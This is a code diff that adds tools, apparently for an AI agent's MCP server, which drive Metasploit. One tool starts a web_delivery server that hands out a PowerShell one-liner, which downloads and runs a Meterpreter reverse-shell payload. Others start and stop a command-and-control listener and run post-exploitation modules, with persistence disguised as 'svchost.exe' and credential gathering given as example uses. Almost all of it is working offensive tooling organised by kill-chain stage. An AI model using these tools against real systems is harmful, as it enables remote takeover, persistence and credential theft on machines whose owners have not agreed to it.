@@ -536,6 +536,155 @@ def metasploit_console(command: str) -> str:
 
 
 @mcp.tool()
+def start_web_delivery(
+    lhost: str,
+    lport: str = "4444",
+    srvport: str = "8080",
+    payload: str = "windows/meterpreter/reverse_https",
+    uripath: str = "/",
+) -> str:
+    """
+    Start Metasploit web_delivery server (Cyber Kill Chain Stage 3 - Delivery).
+
+    Sets up a web server that serves a one-liner. When the target runs the command,
+    they connect back to you. Returns the URL and PowerShell one-liner to share.
+
+    Args:
+        lhost: Your IP (callback for reverse connection)
+        lport: Callback port for Meterpreter (default 4444)
+        srvport: Web server port that serves the payload (default 8080)
+        payload: windows/meterpreter/reverse_https or windows/meterpreter/reverse_tcp
+        uripath: URI path (default /)
+
+    Returns:
+        The one-liner command to run on target and the delivery URL
+    """
+    msf = get_msf_console()
+    cmds = [
+        "use exploit/multi/script/web_delivery",
+        "set TARGET 2",  # PowerShell
+        f"set payload {payload}",
+        f"set LHOST {lhost}",
+        f"set LPORT {lport}",
+        f"set SRVHOST {lhost}",
+        f"set SRVPORT {srvport}",
+        f"set URIPATH {uripath}",
+        "exploit -j",
+    ]
+    full_cmd = "; ".join(cmds)
+    result = msf.execute(full_cmd, timeout=MSF_EXPLOIT_TIMEOUT, quiet_period=MSF_EXPLOIT_QUIET_PERIOD)
+    result = _clean_ansi_output(result)
+
+    # Parse output for the one-liner (powershell -Enc ... or similar)
+    lines = result.split("\n")
+    url = None
+    oneliner = None
+    for i, line in enumerate(lines):
+        if "python" in line.lower() or "powershell" in line.lower() or "curl" in line.lower():
+            oneliner = line.strip()
+        if f"http://{lhost}:{srvport}" in line or f"https://{lhost}:{srvport}" in line:
+            url = line.strip().split()[-1] if line.strip() else None
+
+    if not oneliner:
+        # Look for common patterns
+        for line in lines:
+            if "powershell" in line.lower() and "-" in line:
+                oneliner = line.strip()
+                break
+
+    if url or oneliner:
+        return (
+            f"Web delivery started. LHOST={lhost} LPORT={lport} SRVPORT={srvport}\n\n"
+            f"URL: http://{lhost}:{srvport}{uripath}\n\n"
+            f"One-liner to run on target:\n{oneliner or '(see msfconsole output above)'}\n\n"
+            f"Start multi/handler on {lhost}:{lport} if not already running."
+        )
+    return result
+
+
+@mcp.tool()
+def start_listener(
+    lhost: str,
+    lport: str = "4444",
+    payload: str = "windows/meterpreter/reverse_https",
+) -> str:
+    """
+    Start a Metasploit multi/handler listener (Cyber Kill Chain Stage 6 - C2).
+
+    Use before running exploits or web_delivery so you're ready to receive connections.
+
+    Args:
+        lhost: Your IP (callback address)
+        lport: Port to listen on (default 4444)
+        payload: Payload type, e.g. windows/meterpreter/reverse_https, windows/meterpreter/reverse_tcp
+
+    Returns:
+        Confirmation and listener status
+    """
+    msf = get_msf_console()
+    cmd = (
+        f"use exploit/multi/handler; "
+        f"set payload {payload}; "
+        f"set LHOST {lhost}; "
+        f"set LPORT {lport}; "
+        "exploit -j"
+    )
+    result = msf.execute(cmd, timeout=MSF_EXPLOIT_TIMEOUT, quiet_period=MSF_EXPLOIT_QUIET_PERIOD)
+    return _clean_ansi_output(result)
+
+
+@mcp.tool()
+def stop_listener(job_id: Optional[int] = None) -> str:
+    """
+    Stop a Metasploit handler job.
+
+    Args:
+        job_id: Job ID from 'jobs -l'. If not provided, stops all handler jobs.
+
+    Returns:
+        Job stop confirmation
+    """
+    msf = get_msf_console()
+    if job_id is not None:
+        cmd = f"jobs -k {job_id}"
+    else:
+        cmd = "jobs -K"  # Kill all jobs
+    result = msf.execute(cmd, timeout=MSF_DEFAULT_TIMEOUT, quiet_period=MSF_DEFAULT_QUIET_PERIOD)
+    return _clean_ansi_output(result)
+
+
+@mcp.tool()
+def run_post_module(
+    session_id: int,
+    module: str,
+    options: Optional[str] = None,
+) -> str:
+    """
+    Run a Metasploit post-exploitation module from an active session (Cyber Kill Chain Stage 5 - Installation).
+
+    Use for persistence, migration, credential gathering, etc.
+
+    Args:
+        session_id: Metasploit session ID (from sessions -l)
+        module: Post module path, e.g. post/windows/manage/persistence_exe,
+            post/linux/manage/sshkey_persistence, post/multi/manage/autoroute
+        options: Optional module options as string, e.g. "EXE_NAME=svchost.exe LPORT=4444"
+
+    Returns:
+        Module output
+    """
+    msf = get_msf_console()
+    run_cmd = f"run {module}"
+    if options:
+        run_cmd += " " + options
+    # Escape single quotes in run_cmd for the outer shell
+    run_cmd_escaped = run_cmd.replace("'", "'\"'\"'")
+    cmd = f"sessions -i {session_id} -c '{run_cmd_escaped}'"
+    result = msf.execute(cmd, timeout=MSF_RUN_TIMEOUT, quiet_period=MSF_RUN_QUIET_PERIOD)
+    return _clean_ansi_output(result)
+
+
+@mcp.tool()
 def msf_restart() -> str:
     """
     Restart msfconsole completely for a clean state.
